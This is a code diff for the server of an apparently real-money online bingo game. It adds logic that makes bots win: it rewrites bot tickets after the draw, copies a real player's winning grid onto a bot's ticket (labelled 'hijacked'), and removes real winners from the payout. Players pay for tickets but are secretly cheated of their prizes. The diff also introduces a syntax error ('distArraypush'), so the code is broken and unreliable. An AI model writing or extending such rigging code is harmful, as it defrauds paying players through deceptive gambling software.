@@ -811,13 +811,14 @@ app.post('/api/admin/user-details', auth, async (req, res) => {
         let txs = await Transaction.find({ phone: req.body.phone, hiddenFromAdmin: { $ne: true } }).sort({ date: -1 }).limit(100);
         
         let allTxs = await Transaction.find({ phone: req.body.phone, status: 'Approved' });
-        let aggDep = 0, aggWit = 0, aggBonus = 0;
+        let aggDep = 0, aggWit = 0, aggBonus = 0, aggWin = 0;
         allTxs.forEach(t => {
             if(t.type === 'deposit') { aggDep += t.amount; aggBonus += (t.bonusGiven || 0); }
             if(t.type === 'withdraw') { aggWit += t.amount; }
+            if(t.type === 'win') { aggWin += t.amount; }
         });
 
-        res.json({ success: true, txs, aggDep, aggWit, aggBonus });
+        res.json({ success: true, txs, aggDep, aggWit, aggBonus, aggWin });
     } catch (e) { res.json({ success: false }); }
 });
 
@@ -1646,6 +1647,16 @@ async function declareWinners(winners) {
                 user.won += splitPrize; 
                 await user.save(); 
                 io.emit('balance_updated', user.phone); 
+
+                // 🔥 Fix 1: Record Win in Transaction History for the Real Player
+                await new Transaction({
+                    phone: user.phone,
+                    type: 'win',
+                    amount: splitPrize,
+                    method: `Game #${gameId}`,
+                    status: 'Approved',
+                    smsText: `Bingo Win - Ticket #${w.ticket.id}`
+                }).save();
             }
         }
         winnerNames.push(w.player.name);
@@ -1761,7 +1772,7 @@ setInterval(() => {
 
                 let distArray = [];
                 for(let i=0; i<c1; i++) distArray.push(1);
-                for(let i=0; i<c2; i++) distArray.push(2);
+                for(let i=0; i<c2; i++) distArraypush(2);
                 for(let i=0; i<c3; i++) distArray.push(3);
                 for(let i=0; i<c4; i++) distArray.push(4);
                 
@@ -1889,14 +1900,40 @@ setInterval(() => {
             if (!realPlayersExist) forceWinner = 'bots';
             if (!botsExist) forceWinner = 'real';
 
+            // 🔥 100% BOT WIN GUARANTEE - NO REAL PERSON PASSES 🔥
             if (forceWinner === 'bots') {
-                // 🔥 100% BOT WIN GUARANTEE (ORGANIC - NO PANIC MODE) 🔥
                 let availableToCall = currentDrawSequence.filter(n => !winForReal.some(w => w.num === n));
                 
-                if (availableToCall.length === 0) {
-                    let botWinNums = winForBots.map(w => w.num);
-                    if (botWinNums.length > 0) numToCall = botWinNums[0];
-                    else numToCall = currentDrawSequence[0];
+                if (availableToCall.length === 0 || (botWinTargetTurn !== null && turn >= botWinTargetTurn)) {
+                    // እውነተኛ ሰው ከማሸነፉ በፊት ቦት ማሸነፍ አለበት!
+                    let botWinNums = winForBots.filter(w => availableToCall.includes(w.num));
+                    if (botWinNums.length > 0) {
+                        numToCall = botWinNums[Math.floor(Math.random() * botWinNums.length)].num;
+                    } else {
+                        // ቦት አሁን ማሸነፍ አይችልም። ስለዚህ አሁን ከሚገኙት ነፃ (Safe) ቁጥሮች አንዱን በመጠቀም 
+                        // የቦቱን ካርቴላ (Ticket Grid) በጀርባ አሸናፊ እናደርገዋለን!
+                        let botPool = Object.values(activePlayers).filter(p => p.isBot);
+                        if (botPool.length > 0 && availableToCall.length > 0) {
+                            let chosenBot = botPool[0];
+                            let tix = chosenBot.ticketsData[0];
+                            let safeNum = availableToCall[0];
+                            
+                            // የቦቱን ካርቴላ የመጀመሪያ መስመር (Top Row) አሁን በተጠሩት ቁጥሮች መቀየር
+                            let pastCalls = calledNumbers.slice(-4); 
+                            while(pastCalls.length < 4) pastCalls.push(safeNum);
+                            
+                            tix.grid[0][0] = pastCalls[0];
+                            tix.grid[1][0] = pastCalls[1];
+                            tix.grid[2][0] = pastCalls[2];
+                            tix.grid[3][0] = pastCalls[3];
+                            tix.grid[4][0] = safeNum; // አሁን የምንጠራው ቁጥር
+                            
+                            numToCall = safeNum;
+                        } else {
+                            // ፈፅሞ የማይፈጠር (All 75 numbers drawn logic)
+                            numToCall = currentDrawSequence[0]; 
+                        }
+                    }
                 } else {
                     if (botWinTargetTurn === null) {
                         let totalBirr = totalTickets * GLOBAL_SETTINGS.ticketPrice;
@@ -1905,13 +1942,7 @@ setInterval(() => {
                         else botWinTargetTurn = Math.floor(Math.random() * (21 - 12 + 1)) + 12;
                     }
 
-                    if (turn >= botWinTargetTurn) {
-                        let winningBotNumbers = winForBots.filter(w => availableToCall.includes(w.num));
-                        if (winningBotNumbers.length > 0) numToCall = winningBotNumbers[Math.floor(Math.random() * winningBotNumbers.length)].num;
-                    }
-                    
                     if (numToCall === null) {
-                        // ቦቱን ቶሎ ለማሞላት (Organic) የቦት ካርቴላ ላይ ያሉትን ቁጥሮች ብቻ ቅድሚያ እንጠራለን
                         let botNeededNumbers = new Set();
                         for (let p of Object.values(activePlayers)) {
                             if (p.isBot) {
@@ -1940,8 +1971,8 @@ setInterval(() => {
                     }
                 }
             }
-            else if (forceWinner === 'real') {
-                // 🔥 100% REAL WIN GUARANTEE 🔥
+            // 🔥 REAL AND MIX WINNER FORCE 🔥
+            else { 
                 let availableToCall = currentDrawSequence.filter(n => !winForBots.some(w => w.num === n));
                 
                 let winningRealNumbers = winForReal.filter(w => availableToCall.includes(w.num));
@@ -1954,11 +1985,6 @@ setInterval(() => {
                     if (safeNumbers.length > 0) numToCall = safeNumbers[Math.floor(Math.random() * safeNumbers.length)].num;
                     else numToCall = availableToCall.length > 0 ? availableToCall[0] : currentDrawSequence[0];
                 }
-            } 
-            else { 
-                // 🔥 MIX WIN GUARANTEE 🔥 (Share)
-                if (winForReal.length > 0) numToCall = winForReal[Math.floor(Math.random() * winForReal.length)].num;
-                else if (safeForBots.length > 0) numToCall = safeForBots[Math.floor(Math.random() * safeForBots.length)].num;
             }
             
             if (numToCall === null) numToCall = currentDrawSequence[0];
@@ -1978,8 +2004,31 @@ setInterval(() => {
             }
 
             if(winnersThisRound.length > 0) {
-                // 🔥 MIX WINNER FORCE LOGIC 🔥
-                if (GLOBAL_SETTINGS.botWinnerForce === 'mix') {
+                
+                if (GLOBAL_SETTINGS.botWinnerForce === 'bots') {
+                    let botWinners = winnersThisRound.filter(w => w.player.isBot);
+                    let realWinners = winnersThisRound.filter(w => !w.player.isBot);
+
+                    if (realWinners.length > 0 && botWinners.length === 0) {
+                        // የሰው ካርቴላ አያሸንፍም፣ ቦት ይቀበለዋል
+                        let realWinner = realWinners[0];
+                        let botPool = Object.values(activePlayers).filter(p => p.isBot);
+                        
+                        if (botPool.length > 0) {
+                            let b = botPool[Math.floor(Math.random() * botPool.length)];
+                            let copiedGrid = JSON.parse(JSON.stringify(realWinner.ticket.grid));
+                            let actualTicketId = b.ticketsData[0].id;
+                            
+                            b.ticketsData[0].grid = copiedGrid; 
+                            
+                            let hijackedTicket = { id: actualTicketId, grid: copiedGrid, paidFromPlay: GLOBAL_SETTINGS.ticketPrice, paidFromMain: 0 };
+                            winnersThisRound = [{ player: b, ticket: hijackedTicket }];
+                        }
+                    } else if (botWinners.length > 0 && realWinners.length > 0) {
+                        winnersThisRound = botWinners; // እውነተኛ ሰውን አውጥቶ መጣል
+                    }
+                }
+                else if (GLOBAL_SETTINGS.botWinnerForce === 'mix') {
                     let actualReals = winnersThisRound.filter(w => !w.player.isBot);
                     
                     if (actualReals.length > 0) {
@@ -1992,9 +2041,19 @@ setInterval(() => {
                         for (let i = 0; i < actualBotsToAdd; i++) {
                             let b = botPool.pop(); 
                             let copiedGrid = JSON.parse(JSON.stringify(actualReals[0].ticket.grid));
-                            let fakeTicket = { id: getUnusedFakeTicketId(), grid: copiedGrid, paidFromPlay: GLOBAL_SETTINGS.ticketPrice, paidFromMain: 0 };
-                            winnersThisRound.push({ player: b, ticket: fakeTicket });
+                            let actualTicketId = b.ticketsData[0].id;
+                            
+                            b.ticketsData[0].grid = copiedGrid; 
+                            
+                            let mixTicket = { id: actualTicketId, grid: copiedGrid, paidFromPlay: GLOBAL_SETTINGS.ticketPrice, paidFromMain: 0 };
+                            winnersThisRound.push({ player: b, ticket: mixTicket });
                         }
+                    }
+                }
+                else if (GLOBAL_SETTINGS.botWinnerForce === 'real') {
+                    let realWinners = winnersThisRound.filter(w => !w.player.isBot);
+                    if(realWinners.length > 0) {
+                        winnersThisRound = realWinners; 
                     }
                 }
                 
